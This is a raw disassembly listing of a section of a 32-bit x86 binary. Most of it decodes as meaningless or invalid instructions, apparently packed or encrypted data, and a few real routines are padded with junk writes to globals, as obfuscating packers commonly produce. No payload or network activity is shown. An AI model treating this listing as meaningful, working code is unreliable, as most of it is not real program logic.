  41a110:	neg    BYTE PTR [esi-0x1eaf9557]
  41a116:	sbb    DWORD PTR [ebp+0x3d856dc2],edi
  41a11c:	int    0x50
  41a11e:	xor    al,0x6
  41a120:	pop    ecx
  41a121:	cmovb  ebx,edx
  41a124:	mov    esi,ebx
  41a126:	sti    
  41a127:	jmp    0x41a178
  41a129:	or     dl,BYTE PTR [eax]
  41a12b:	mov    ah,0xaa
  41a12d:	loopne 0x41a12f
  41a12f:	in     eax,dx
  41a130:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a131:	out    0xc5,eax
  41a133:	ret    
  41a134:	dec    esi
  41a135:	fadd   st,st(7)
  41a137:	scas   eax,DWORD PTR es:[edi]
  41a138:	mov    ebp,0x6948a88c
  41a13d:	call   0xd69341f0
  41a142:	xor    eax,0xfd4d64a0
  41a147:	fs js  0x41a1a2
  41a14a:	out    dx,al
  41a14b:	pop    edi
  41a14c:	retf   0x6a78
  41a14f:	mov    bl,BYTE PTR [eax+0x19]
  41a152:	(bad)  
  41a153:	stos   DWORD PTR es:[edi],eax
  41a154:	mov    dl,0xca
  41a156:	jne    0x41a1aa
  41a158:	lock add dh,ah
  41a15b:	pop    ds
  41a15c:	push   es
  41a15d:	cdq    
  41a15e:	int3   
  41a15f:	imul   ebp,DWORD PTR [ebx+0x4c],0x51
  41a163:	push   eax
  41a164:	push   eax
  41a165:	mov    ds:0xb95e776a,al
  41a16a:	push   ebx
  41a16b:	sti    
  41a16c:	(bad)  
  41a16d:	and    ch,bh
  41a16f:	sbb    DWORD PTR [edx+0x55],0x734dee84
  41a176:	xor    edi,DWORD PTR [edi-0x6f]
  41a179:	xchg   esi,eax
  41a17a:	call   0x41d271
  41a17f:	pop    edi
  41a180:	leave  
  41a181:	ret    0x1c
  41a184:	mov    DWORD PTR ds:0x4228ae,0x3cc2
  41a18e:	cmp    cl,0x40
  41a191:	mov    DWORD PTR ds:0x4228f6,0x571c
  41a19b:	jae    0x41a710
  41a1a1:	mov    DWORD PTR ds:0x42289a,0x49b8
  41a1ab:	cmp    cl,0x20
  41a1ae:	mov    DWORD PTR ds:0x4228b6,0x4a57
  41a1b8:	jae    0x41a1ce
  41a1be:	shrd   eax,edx,cl
  41a1c1:	mov    DWORD PTR ds:0x4229c2,0x6fa1
  41a1cb:	shr    edx,cl
  41a1cd:	ret    
  41a1ce:	neg    eax
  41a1d0:	mov    eax,edx
  41a1d2:	jmp    0x41a708
  41a1d7:	fldenv [eax+edi*4]
  41a1da:	inc    edx
  41a1db:	cmp    BYTE PTR [edx],dl
  41a1dd:	pop    ecx
  41a1de:	adc    al,0xa6
  41a1e0:	inc    esp
  41a1e1:	xor    al,0x68
  41a1e3:	push   0x4ea84e9f
  41a1e8:	cmp    DWORD PTR [esi+edx*1],ecx
  41a1eb:	in     eax,0x4
  41a1ed:	push   ss
  41a1ee:	push   ss
  41a1ef:	nop
  41a1f0:	xor    eax,0x39261f23
  41a1f5:	repnz add edx,DWORD PTR [ebx]
  41a1f8:	ins    BYTE PTR es:[edi],dx
  41a1f9:	sub    ah,dl
  41a1fb:	xlat   BYTE PTR ds:[ebx]
  41a1fc:	out    dx,al
  41a1fd:	jge    0x41a1a0
  41a1ff:	xlat   BYTE PTR ds:[ebx]
  41a200:	pop    ds
  41a201:	in     al,dx
  41a202:	(bad)  
  41a203:	retf   
  41a204:	je     0x41a203
  41a206:	ds jmp 0x147b:0xa75a541b
  41a20e:	inc    eax
  41a20f:	(bad)
  41a214:	out    0x39,al
  41a216:	push   esi
  41a217:	xchg   edi,eax
  41a218:	fadd   DWORD PTR [ebp+0x57]
  41a21b:	seta   BYTE PTR [edx-0x55987bf5]
  41a222:	mov    bh,al
  41a224:	xchg   edx,eax
  41a225:	fcmovnb st,st(6)
  41a227:	sub    dl,cl
  41a229:	jbe    0x41a22c
  41a22b:	pop    esp
  41a22c:	retf   
  41a22d:	push   DWORD PTR [edi+0x6f]
  41a230:	jbe    0x41a226
  41a232:	jnp    0x41a1f5
  41a234:	push   ss
  41a235:	adc    edi,DWORD PTR [edx]
  41a237:	cwde   
  41a238:	sub    al,0xed
  41a23a:	push   esp
  41a23b:	or     DWORD PTR [esi],edx
  41a23d:	sbb    bl,al
  41a23f:	pop    edx
  41a240:	(bad)  
  41a241:	(bad)  
  41a242:	fsubr  st,st(6)
  41a244:	pop    ds
  41a245:	lods   eax,DWORD PTR ds:[esi]
  41a246:	vmread DWORD PTR ds:0xc2a4b9ee,esi
  41a24d:	inc    ebx
  41a24e:	call   0x9d29:0x6ea65925
  41a255:	idiv   bl
  41a257:	xor    cl,0x84
  41a25a:	mov    ch,0x6a
  41a25c:	int3   
  41a25d:	pop    ds
  41a25e:	lock fdivr DWORD PTR [eax+ecx*1+0x1a]
  41a263:	add    al,BYTE PTR [ebp-0x18]
  41a266:	jge    0x41a202
  41a268:	mov    ch,0xa5
  41a26a:	mov    cl,0xb1
  41a26c:	cmp    ecx,0xfffffff7
  41a26f:	cli    
  41a270:	(bad)  [ebp-0x46f1c29e]
  41a276:	stos   DWORD PTR es:[edi],eax
  41a277:	push   ds
  41a278:	dec    edi
  41a279:	sbb    ch,BYTE PTR [ebp+0x24]
  41a27c:	sub    al,0x72
  41a27e:	div    ah
  41a280:	push   eax
  41a281:	iret   
  41a282:	inc    ecx
  41a283:	sbb    bh,BYTE PTR [edx-0x45f34078]
  41a289:	add    cl,bh
  41a28b:	jg     0x41a2ac
  41a28d:	stos   DWORD PTR es:[edi],eax
  41a28e:	pusha  
  41a28f:	jecxz  0x41a2e1
  41a291:	repnz lea edx,[edx-0x7]
  41a295:	arpl   WORD PTR [eax+0xe],ax
  41a298:	sbb    BYTE PTR [ebp-0x4ba3f4cc],ch
  41a29e:	fwait
  41a29f:	or     eax,0xae535895
  41a2a4:	dec    eax
  41a2a5:	sbb    al,BYTE PTR [ecx]
  41a2a7:	add    ebp,DWORD PTR [edx-0x340adfa1]
  41a2ad:	rol    ah,1
  41a2af:	test   al,0x97
  41a2b1:	outs   dx,BYTE PTR ds:[esi]
  41a2b2:	fnstenv [ebp+0x6b3078e0]
  41a2b8:	xchg   ebx,eax
  41a2b9:	xlat   BYTE PTR cs:[ebx]
  41a2bb:	int3   
  41a2bc:	or     DWORD PTR [ebp-0x27],ebp
  41a2bf:	push   edi
  41a2c0:	add    BYTE PTR ds:0x748b619c,cl
  41a2c6:	mov    dh,0xec
  41a2c8:	jo     0x41a2fa
  41a2ca:	push   ds
  41a2cb:	jns    0x41a27b
  41a2cd:	cdq    
  41a2ce:	jp     0x41a302
  41a2d0:	adc    al,0x3
  41a2d2:	mov    cl,0x29
  41a2d4:	mov    dh,0xda
  41a2d6:	je     0x41a2e0
  41a2d8:	xchg   esi,eax
  41a2d9:	les    esi,FWORD PTR ds:0x8e47a3ac
  41a2df:	sbb    BYTE PTR [eax-0x14],dh
  41a2e2:	mov    ch,0xf8
  41a2e4:	xchg   BYTE PTR [eax-0x4191d67e],dh
  41a2ea:	inc    edi
  41a2eb:	(bad)  
  41a2ed:	frstor [eax-0x316fb48]
  41a2f3:	lea    esp,[ecx-0x53]
  41a2f6:	xchg   esi,eax
  41a2f7:	cmp    esp,DWORD PTR [ebx+0x7e030f87]
  41a2fd:	lods   eax,DWORD PTR ds:[esi]
  41a2fe:	test   eax,0x6d6e5844
  41a303:	arpl   WORD PTR [ebx+0x40],cx
  41a306:	dec    ecx
  41a307:	mov    es,WORD PTR [ecx+0x730e81ae]
  41a30d:	sub    cl,al
  41a30f:	out    0x47,al
  41a311:	or     al,0xe7
  41a313:	jb     0x41a327
  41a315:	pop    es
  41a316:	cmp    al,bl
  41a318:	mov    dl,0x45
  41a31a:	cs out 0x12,eax
  41a31d:	sbb    BYTE PTR [edi+eax*4-0xf1e21ad],bl
  41a324:	mov    ebp,0x44b65f71
  41a329:	mov    esp,0xd17ae86e
  41a32e:	adc    DWORD PTR [ebx-0x68],eax
  41a331:	adc    bl,BYTE PTR [edi-0x1be6f060]
  41a337:	(bad)  
  41a338:	mov    ecx,0x2039dd3e
  41a33d:	lods   eax,DWORD PTR ds:[esi]
  41a33e:	jbe    0x41a2ea
  41a340:	neg    DWORD PTR [ebx-0x48]
  41a343:	xor    bh,BYTE PTR [ebp-0x6bb3c515]
  41a349:	shr    esp,1
  41a34b:	fcmovbe st,st(6)
  41a34d:	into   
  41a34e:	cld    
  41a34f:	mov    ds,eax
  41a351:	mov    ch,0x99
  41a353:	xor    eax,0x13e11212
  41a358:	(bad)  
  41a359:	clc    
  41a35a:	add    eax,0x26f34398
  41a35f:	mov    BYTE PTR [ecx],dh
  41a361:	lahf   
  41a362:	xchg   ebp,eax
  41a363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a364:	(bad)  
  41a366:	cli    
  41a367:	push   esi
  41a368:	xchg   edi,eax
  41a369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a36a:	add    eax,0x596ccb4a
  41a36f:	jbe    0x41a308
  41a371:	lea    ebx,[esi]
  41a373:	cmp    al,0x3d
  41a375:	and    eax,DWORD PTR [ebp+0x4d300e0a]
  41a37b:	or     eax,ebx
  41a37d:	xchg   ebx,eax
  41a37e:	push   0xc4f7d9e5
  41a383:	mov    cl,0xa3
  41a385:	ret    0xd7ec
  41a388:	jmp    0xf767:0xc94cbcb7
  41a38f:	jno    0x41a3a7
  41a391:	(bad)  
  41a392:	(bad)  
  41a393:	repnz repnz and ebx,ebp
  41a397:	mov    bh,0x6a
  41a399:	bound  esp,QWORD PTR [ecx-0x210988da]
  41a39f:	ret    
  41a3a0:	shr    edi,cl
  41a3a2:	retf   0xa34
  41a3a5:	mov    dh,0x9b
  41a3a7:	mov    edi,0x7ae0a9a5
  41a3ac:	sbb    BYTE PTR [eax+0x746124b7],dl
  41a3b2:	cld    
  41a3b3:	mov    al,ds:0x3042eaa8
  41a3b8:	sub    al,0xc3
  41a3ba:	add    al,0x39
  41a3bc:	mov    edx,0x6870dad2
  41a3c1:	sbb    eax,0x34feb556
  41a3c6:	mov    edi,0xb1deb327
  41a3cb:	(bad)  
  41a3cc:	sbb    al,0xc1
  41a3ce:	xor    eax,0xd5fd451c
  41a3d3:	add    eax,DWORD PTR [esi]
  41a3d5:	hlt    
  41a3d6:	push   cs
  41a3d7:	and    al,0x2e
  41a3d9:	ret    0x3c12
  41a3dc:	mov    dh,0x3c
  41a3de:	fmul   QWORD PTR [ebx+eiz*4+0x5f0d0153]
  41a3e5:	imul   edi,DWORD PTR [edx+0x5807e13],0x3d
  41a3ec:	sub    BYTE PTR [edx],ah
  41a3ee:	in     al,dx
  41a3ef:	cmp    eax,0x9970a8e5
  41a3f4:	sbb    DWORD PTR [edx],esi
  41a3f6:	loop   0x41a39c
  41a3f8:	mov    eax,ds:0x284899c6
  41a3fd:	mov    al,0x0
  41a3ff:	jmp    0xb886:0x3786a4e9
  41a406:	bnd jg 0x41a3e5
  41a409:	je     0x41a3fb
  41a40b:	ror    DWORD PTR [ebx+0x3f],1
  41a40e:	pop    edi
  41a40f:	loopne 0x41a3e0
  41a411:	cli    
  41a412:	xor    al,0x9d
  41a414:	xchg   esi,eax
  41a415:	data16 mov ds:0xc730396b,al
  41a41b:	mov    ecx,0x84ec4086
  41a420:	inc    ebp
  41a421:	xchg   ecx,eax
  41a422:	push   edi
  41a423:	iret   
  41a424:	test   ah,ch
  41a426:	dec    ecx
  41a427:	and    cl,BYTE PTR [ebp-0x73d9cb0c]
  41a42d:	push   es
  41a42e:	xor    ebx,DWORD PTR [edx+eiz*4+0x2b]
  41a432:	popa   
  41a433:	retf   0x6a88
  41a436:	stos   DWORD PTR es:[edi],eax
  41a437:	dec    esp
  41a438:	lods   eax,DWORD PTR ds:[esi]
  41a439:	sub    DWORD PTR ds:0xa1cf3c06,0x119ac670
  41a443:	cwde   
  41a444:	dec    ebx
  41a445:	jp     0x41a3dc
  41a447:	xchg   ecx,eax
  41a448:	or     BYTE PTR [eax-0x308d92b8],dl
  41a44e:	jle    0x41a494
  41a450:	es ss push 0x45
  41a454:	push   es
  41a455:	pop    ecx
  41a456:	adc    edi,DWORD PTR [edx]
  41a458:	xchg   edx,eax
  41a459:	shl    bl,1
  41a45b:	test   BYTE PTR [edi-0x73332660],ah
  41a461:	cs push eax
  41a463:	add    eax,0x97ef9914
  41a468:	jl     0x41a46a
  41a46a:	std    
  41a46b:	dec    ebx
  41a46c:	inc    eax
  41a46d:	loope  0x41a412
  41a46f:	sbb    esi,edx
  41a471:	cmp    al,0xe9
  41a473:	push   ds
  41a474:	in     eax,dx
  41a475:	mov    ?,ebx
  41a477:	repnz dec edx
  41a479:	dec    ecx
  41a47a:	or     eax,0x7bbda22
  41a47f:	pop    ds
  41a480:	sbb    bh,BYTE PTR [ebx-0x41]
  41a483:	sub    BYTE PTR [ecx],dl
  41a485:	mov    DWORD PTR [ebx-0x77b65aa7],ebx
  41a48b:	les    edi,FWORD PTR [eax-0x2b]
  41a48e:	and    eax,0xd1ea6ad3
  41a493:	push   cs
  41a494:	push   ebx
  41a495:	cmp    ch,BYTE PTR [esi]
  41a497:	shl    BYTE PTR [esi+0x6377b105],0x85
  41a49e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a49f:	or     eax,0xbb269bc5
  41a4a4:	xor    edx,DWORD PTR gs:[esi-0x1e]
  41a4a8:	or     BYTE PTR [ebx+0x4d],bh
  41a4ab:	add    eax,0x3b098330
  41a4b0:	aas    
  41a4b1:	xor    ah,ah
  41a4b3:	push   eax
  41a4b4:	add    al,0x59
  41a4b6:	lahf   
  41a4b7:	mov    ecx,0x4702537f
  41a4bc:	test   DWORD PTR [ebx-0x1a725ff9],eax
  41a4c2:	rcr    DWORD PTR [esi+0x6c791976],0xaf
  41a4c9:	sub    cl,BYTE PTR [ebp-0x3d]
  41a4cc:	loop   0x41a4da
  41a4ce:	outs   dx,DWORD PTR ds:[esi]
  41a4cf:	(bad)  
  41a4d0:	or     dl,0x83
  41a4d3:	test   BYTE PTR [ebx],cl
  41a4d5:	dec    ebx
  41a4d6:	mov    eax,0x44d6ced4
  41a4db:	push   es
  41a4dc:	pushf  
  41a4dd:	stc    
  41a4de:	arpl   WORD PTR [esi-0x5c5f31b],cx
  41a4e4:	sub    dl,BYTE PTR [esi+0x7d]
  41a4e7:	ins    DWORD PTR es:[edi],dx
  41a4e8:	jnp    0x41a4ca
  41a4ea:	pop    ds
  41a4eb:	inc    ebx
  41a4ec:	mov    esi,edi
  41a4ee:	xor    eax,0xee2edcce
  41a4f3:	cmc    
  41a4f4:	test   DWORD PTR [edx-0x34],0x874d8eba
  41a4fb:	dec    ebp
  41a4fc:	test   eax,0x7ed5938d
  41a501:	fimul  WORD PTR [edx+0x5ec22bf6]
  41a507:	mov    al,ds:0x9977d9ad
  41a50c:	jmp    0x41a4f0
  41a50e:	into   
  41a50f:	retf   
  41a510:	lods   al,BYTE PTR ds:[esi]
  41a511:	popf   
  41a512:	loop   0x41a4a5
  41a514:	xor    al,0x19
  41a516:	rcl    ch,cl
  41a518:	in     eax,0x4a
  41a51a:	xchg   edi,eax
  41a51b:	mov    ah,0xd1
  41a51d:	ss mov dl,0xaa
  41a520:	or     DWORD PTR es:[edx-0x52],ebp
  41a524:	addr16 or al,0xa3
  41a527:	cmp    eax,0x6862c143
  41a52c:	(bad)  
  41a52d:	(bad)  
  41a52f:	mov    ah,BYTE PTR [esi]
  41a531:	cmp    eax,0x94b4c10d
  41a536:	loop   0x41a510
  41a538:	fnsave [eax+0xd]
  41a53b:	arpl   WORD PTR [ebx+0x47],sp
  41a53e:	mov    eax,ds:0x6f4166bd
  41a543:	add    ch,BYTE PTR [edi+0x6]
  41a546:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a547:	ins    BYTE PTR es:[edi],dx
  41a548:	inc    ecx
  41a549:	adc    DWORD PTR [ebp-0x53512722],0x416cbeb8
  41a553:	sbb    DWORD PTR [edi+0x75],0x8c5ea918
  41a55a:	ret    
  41a55b:	pop    ss
  41a55c:	mov    al,ds:0x76879c53
  41a561:	and    eax,0x86ab0612
  41a566:	ja     0x41a515
  41a568:	loopne 0x41a580
  41a56a:	push   ss
  41a56b:	dec    ebx
  41a56c:	mov    cl,0x47
  41a56e:	mov    eax,ds:0xe7b58129
  41a573:	(bad)  
  41a574:	cwde   
  41a575:	sahf   
  41a576:	sar    BYTE PTR [eax+0x40],1
  41a579:	push   esp
  41a57a:	sbb    eax,0x512cd84d
  41a57f:	in     al,dx
  41a580:	cdq    
  41a581:	enter  0xeacd,0x77
  41a585:	jns    0x41a5e0
  41a587:	mov    dh,0xc3
  41a589:	(bad)
  41a58c:	out    dx,eax
  41a58d:	outs   dx,DWORD PTR ds:[esi]
  41a58e:	mov    DWORD PTR [edx+0x6a06fdb0],edi
  41a594:	inc    ebx
  41a595:	aas    
  41a596:	into   
  41a597:	jnp    0x41a5c9
  41a599:	xor    ebp,DWORD PTR [ecx+0x71f735f5]
  41a59f:	adc    bl,BYTE PTR [ecx]
  41a5a1:	mov    eax,ds:0xcb9c9aeb
  41a5a6:	adc    BYTE PTR [esi+eax*4+0x26],ch
  41a5aa:	mov    ds:0x5519ebd7,al
  41a5af:	push   edi
  41a5b0:	pop    ebx
  41a5b1:	test   al,0x39
  41a5b3:	in     eax,dx
  41a5b4:	sub    DWORD PTR [ebx],0x2c
  41a5b7:	repz cli 
  41a5b9:	mov    ds:0x90790389,eax
  41a5be:	xchg   esi,eax
  41a5bf:	mov    ecx,eax
  41a5c1:	pop    ecx
  41a5c2:	outs   dx,DWORD PTR ds:[esi]
  41a5c3:	clc    
  41a5c4:	mov    edx,0x19c73013
  41a5c9:	push   ecx
  41a5ca:	inc    eax
  41a5cb:	sub    ebp,DWORD PTR [ecx-0x11]
  41a5ce:	cmp    BYTE PTR [eax+0x327e4d9e],ah
  41a5d4:	nop
  41a5d5:	pop    eax
  41a5d6:	dec    ecx
  41a5d7:	xor    al,0x45
  41a5d9:	sti    
  41a5da:	retf   0xf538
  41a5dd:	cmp    eax,0xa7122415
  41a5e2:	js     0x41a568
  41a5e4:	adc    eax,0x504ccfe
  41a5e9:	mov    dh,0x3
  41a5eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5ec:	pop    eax
  41a5ed:	addr16 pop es
  41a5ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5f0:	arpl   WORD PTR [ebx+0x33aeb249],si
  41a5f6:	outs   dx,DWORD PTR ds:[esi]
  41a5f7:	cmp    cl,0x25
  41a5fa:	jno    0x41a628
  41a5fc:	mov    cs,WORD PTR [esi+0x1b6ca0a0]
  41a602:	hlt    
  41a603:	mov    ebp,0x70379490
  41a608:	inc    esi
  41a609:	dec    edi
  41a60a:	bound  edi,QWORD PTR [ebp+ebp*1+0x3b]
  41a60e:	push   ebp
  41a60f:	add    bl,ah
  41a611:	call   0xb57500d7
  41a616:	jno    0x41a5a5
  41a618:	fs cmp eax,0x7a4484e3
  41a61e:	push   esi
  41a61f:	jb     0x41a5fb
  41a621:	inc    edi
  41a622:	mov    ebp,0x1ce16d49
  41a627:	mov    eax,0x3efdce0c
  41a62c:	xchg   edi,eax
  41a62d:	ficomp WORD PTR [eax+0x25113c7d]
  41a633:	push   ecx
  41a634:	add    eax,0xcef0793
  41a639:	xchg   edi,eax
  41a63a:	inc    ecx
  41a63b:	or     eax,0x98eceb1a
  41a640:	add    edi,edi
  41a642:	into   
  41a643:	in     al,0x38
  41a645:	inc    eax
  41a646:	imul   edi,esp,0x2d
  41a649:	push   es
  41a64a:	pop    ss
  41a64b:	mov    BYTE PTR ds:0x192106ce,al
  41a651:	push   ecx
  41a652:	call   DWORD PTR [esi-0x10b25636]
  41a658:	ficom  WORD PTR [ebx-0x4d]
  41a65b:	and    eax,0xd7c2d8b3
  41a660:	add    al,0xca
  41a662:	dec    ecx
  41a663:	rcr    ah,1
  41a665:	test   BYTE PTR [esi+edx*8],bh
  41a668:	shl    DWORD PTR es:[esi+0x5dd7cca7],cl
  41a66f:	xchg   esp,eax
  41a670:	mov    edx,DWORD PTR [eax+0x67]
  41a673:	ja     0x41a67e
  41a675:	add    BYTE PTR [edx],ch
  41a677:	adc    dl,ah
  41a679:	xchg   ebp,eax
  41a67a:	push   es
  41a67b:	jo     0x41a66c
  41a67d:	div    BYTE PTR [esi+0x3cd504bb]
  41a683:	out    0x78,al
  41a685:	or     al,0x4e
  41a687:	xchg   ebp,eax
  41a688:	add    eax,0x88278eda
  41a68d:	cmp    BYTE PTR [edx-0xc105a51],ah
  41a693:	and    al,0xc0
  41a695:	mov    ds:0xb4479b6,eax
  41a69a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a69b:	pusha  
  41a69c:	inc    edx
  41a69d:	ins    BYTE PTR es:[edi],dx
  41a69e:	stos   BYTE PTR es:[edi],al
  41a69f:	enter  0x1c5d,0x45
  41a6a3:	jbe    0x41a64d
  41a6a5:	push   esp
  41a6a6:	xlat   BYTE PTR ds:[ebx]
  41a6a7:	js     0x41a6b1
  41a6a9:	popa   
  41a6aa:	jg     0x41a6c6
  41a6ac:	out    dx,eax
  41a6ad:	pop    edi
  41a6ae:	and    eax,0x382fbf41
  41a6b3:	retf   
  41a6b4:	adc    BYTE PTR [edi-0x63905edf],ah
  41a6ba:	stos   DWORD PTR es:[edi],eax
  41a6bb:	or     eax,0x6b49f4e7
  41a6c0:	pop    ebp
  41a6c1:	scas   eax,DWORD PTR es:[edi]
  41a6c2:	xor    BYTE PTR [ebx-0x540dd5c4],al
  41a6c8:	pop    esi
  41a6c9:	xchg   ebx,eax
  41a6ca:	mov    ecx,0x98ee170c
  41a6cf:	pop    ebp
  41a6d0:	idiv   esp
  41a6d2:	sub    DWORD PTR [esi],ecx
  41a6d4:	xchg   edi,eax
  41a6d5:	fisttp WORD PTR [esi-0x3b151c25]
  41a6db:	mov    ds:0x8242c01e,al
  41a6e0:	xchg   dh,bl
  41a6e2:	xchg   BYTE PTR [ebp-0x17],bl
  41a6e5:	gs jle 0x41a72c
  41a6e8:	(bad)  
  41a6e9:	push   0x66
  41a6eb:	push   esi
  41a6ec:	xor    ah,BYTE PTR [ecx-0xa]
  41a6ef:	aas    
  41a6f0:	gs inc edi
  41a6f2:	inc    ecx
  41a6f3:	not    BYTE PTR [edi+0x4804fbb8]
  41a6f9:	enter  0x10a9,0xff
  41a6fd:	push   esp
  41a6fe:	jge    0x41a75c
  41a700:	inc    esp
  41a701:	(bad)  
  41a702:	imul   edi,DWORD PTR [ebp+0x3e64f020],0x33
  41a709:	rol    BYTE PTR [eax-0x172ce01f],cl
  41a70f:	ret    
  41a710:	xor    eax,eax
  41a712:	xor    edx,edx
  41a714:	ret    
  41a715:	push   ebp
  41a716:	mov    ebp,esp
  41a718:	sub    esp,0x40
  41a71b:	sub    ecx,ecx
  41a71d:	mov    DWORD PTR [ebp-0x18],0xba699573
  41a724:	xor    eax,ecx
  41a726:	mov    eax,0x9c0a89d8
  41a72b:	mov    edx,DWORD PTR ds:0x422976
  41a731:	sbb    DWORD PTR ds:0x42291a,edx
  41a737:	mov    DWORD PTR [ebp-0x14],eax
  41a73a:	mov    DWORD PTR [ebp-0x40],0xba699577
  41a741:	sub    edx,0x26e4
  41a747:	mov    DWORD PTR [ebp-0x3c],eax
  41a74a:	sbb    DWORD PTR ds:0x4228ba,edx
  41a750:	mov    DWORD PTR [ebp-0x28],0x644f
  41a757:	cmp    DWORD PTR ds:0x4228ae,0x0
  41a75e:	mov    ecx,DWORD PTR ds:0x4228fa
  41a764:	mov    DWORD PTR ds:0x42288a,edx
  41a76a:	mov    edx,DWORD PTR ds:0x42299e
  41a770:	jmp    0x41a7c9
  41a775:	mov    DWORD PTR ds:0x4229ce,ecx
  41a77b:	jbe    0x41a7ad
  41a781:	push   DWORD PTR [ebp-0x20]
  41a784:	call   DWORD PTR ds:0x42a028
  41a78a:	sub    DWORD PTR ds:0x42290a,0x27cb
  41a794:	movzx  ecx,BYTE PTR ds:0x422966
  41a79b:	and    ecx,DWORD PTR ds:0x4229d2
  41a7a1:	mov    DWORD PTR ds:0x422966,ecx
  41a7a7:	add    DWORD PTR ds:0x422972,edx
  41a7ad:	or     DWORD PTR ds:0x42296a,0x5f39
  41a7b7:	sbb    DWORD PTR ds:0x4229b6,edx
  41a7bd:	sbb    DWORD PTR ds:0x422932,edx
  41a7c3:	sub    edx,DWORD PTR ds:0x4228c2
  41a7c9:	mov    DWORD PTR [ebp-0x24],0x68c8
  41a7d0:	xor    eax,edx
  41a7d2:	mov    DWORD PTR [ebp-0x20],0x436a
  41a7d9:	cmp    DWORD PTR ds:0x4228aa,0x0
  41a7e0:	mov    edx,0x68cf
  41a7e5:	mov    DWORD PTR ds:0x422922,ebx
  41a7eb:	mov    edx,DWORD PTR ds:0x422936
  41a7f1:	jmp    0x41a823
  41a7f6:	mov    eax,ds:0x42292a
  41a7fb:	jne    0x41a818
  41a801:	push   0x4229b6
  41a806:	call   DWORD PTR ds:0x42a054
  41a80c:	adc    DWORD PTR ds:0x4229ba,ecx
  41a812:	sub    edx,DWORD PTR ds:0x4228aa
  41a818:	xor    DWORD PTR ds:0x4229ce,0x5de2
  41a822:	dec    ecx
  41a823:	mov    DWORD PTR [ebp-0x1c],0x58c6
  41a82a:	mov    DWORD PTR [ebp-0x10],0x7919
  41a831:	mov    DWORD PTR [ebp-0xc],0x6efc
  41a838:	mov    eax,DWORD PTR [ebp-0x10]
  41a83b:	sub    DWORD PTR ds:0x4228da,0x3418
  41a845:	mov    ecx,DWORD PTR [ebp-0xc]
  41a848:	jmp    0x41ac91
  41a84d:	mov    ?,WORD PTR [edx-0x20]
  41a850:	dec    ebx
  41a851:	fdiv   DWORD PTR [ecx]
  41a853:	adc    al,0x32
  41a855:	std    
  41a856:	cs aam 0xa8
  41a859:	mov    esi,0x1c7411b5
  41a85e:	das    
  41a85f:	or     al,0x16
  41a861:	(bad)  
  41a862:	push   cs
  41a863:	push   ss
  41a864:	push   ss
  41a865:	mov    bl,0xc7
  41a867:	cmp    ah,ah
  41a869:	xlat   BYTE PTR ds:[ebx]
  41a86a:	mov    esi,0x1db0dc95
  41a86f:	in     al,dx
  41a870:	ins    BYTE PTR es:[edi],dx
  41a871:	call   0x9b87:0x26f8dcea
  41a878:	push   esp
  41a879:	cmp    eax,DWORD PTR [ebp-0x489dfd59]
  41a87f:	sti    
  41a880:	mov    ecx,0xfabefd40
  41a885:	sti    
  41a886:	test   eax,0xace6a2f2
  41a88c:	and    eax,0x39928c8c
  41a891:	dec    esp
  41a892:	or     eax,0xfb9f0c73
  41a897:	jg     0x41a8d0
  41a899:	push   edi
  41a89a:	aas    
  41a89b:	pop    ss
  41a89c:	loopne 0x41a8d5
  41a89e:	ds ja  0x41a902
  41a8a1:	sub    DWORD PTR [edi+0x2a],0xffffffb2
  41a8a5:	or     edi,DWORD PTR [edi]
  41a8a7:	into   
  41a8a8:	sbb    BYTE PTR [edx+0x4028c4ef],dh
  41a8ae:	lds    ebp,FWORD PTR [eax+edx*1]
  41a8b1:	aam    0x47
  41a8b3:	xchg   DWORD PTR [edi+0x61],ecx
  41a8b6:	jmp    0x41a91f
  41a8b8:	pop    edi
  41a8b9:	out    dx,eax
  41a8ba:	ins    BYTE PTR es:[edi],dx
  41a8bb:	imul   edi,DWORD PTR [edi-0xf],0xffffffd5
  41a8bf:	inc    ebp
  41a8c0:	mov    ah,0x72
  41a8c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8c3:	xchg   esi,eax
  41a8c4:	push   edx
  41a8c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8c6:	out    0xa2,al
  41a8c8:	repz bound eax,QWORD PTR [ebx+0x5d46be21]
  41a8cf:	mov    ebx,0x5b88461e
  41a8d4:	and    edi,ebx
  41a8d6:	adc    dl,BYTE PTR [ebp-0x1630798f]
  41a8dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8dd:	push   ebx
  41a8de:	jb     0x41a897
  41a8e0:	cmp    al,0x2c
  41a8e2:	push   ebx
  41a8e3:	mov    WORD PTR [esi-0x12b4e175],?
  41a8e9:	push   ecx
  41a8ea:	dec    esp
  41a8eb:	or     bl,bh
  41a8ed:	xchg   esp,eax
  41a8ee:	ds xchg edx,eax
  41a8f0:	adc    al,0x97
  41a8f2:	test   al,0xef
  41a8f4:	test   eax,0x6c3b9757
  41a8f9:	mov    bh,0xce
  41a8fb:	xchg   esp,eax
  41a8fc:	mov    eax,ds:0x790c0002
  41a901:	sar    DWORD PTR [ebx],0x6f
  41a904:	jmp    0x41a92a
  41a906:	jle    0x41a904
  41a908:	jo     0x41a8d7
  41a90a:	es (bad) 
  41a90c:	(bad)  
  41a90d:	xlat   BYTE PTR ds:[ebx]
  41a90e:	not    ch
  41a910:	ins    BYTE PTR es:[edi],dx
  41a911:	dec    esp
  41a912:	push   edx
  41a913:	ins    BYTE PTR es:[edi],dx
  41a914:	mov    ebp,0xf737aff0
  41a919:	pusha  
  41a91a:	in     eax,dx
  41a91b:	ret    0x51a8
  41a91e:	fnsave [ebx]
  41a920:	adc    ecx,edi
  41a922:	push   esp
  41a923:	mov    edx,0x800024c0
  41a928:	test   dh,dl
  41a92a:	mov    esi,0x29751e51
  41a92f:	inc    edi
  41a930:	sub    dh,dl
  41a932:	aam    0x2d
  41a934:	sti    
  41a935:	scas   al,BYTE PTR es:[edi]
  41a936:	xor    al,0x72
  41a938:	loope  0x41a8cb
  41a93a:	cmp    eax,0x442f2045
  41a93f:	fwait
  41a940:	sbb    DWORD PTR [edx-0x65],esp
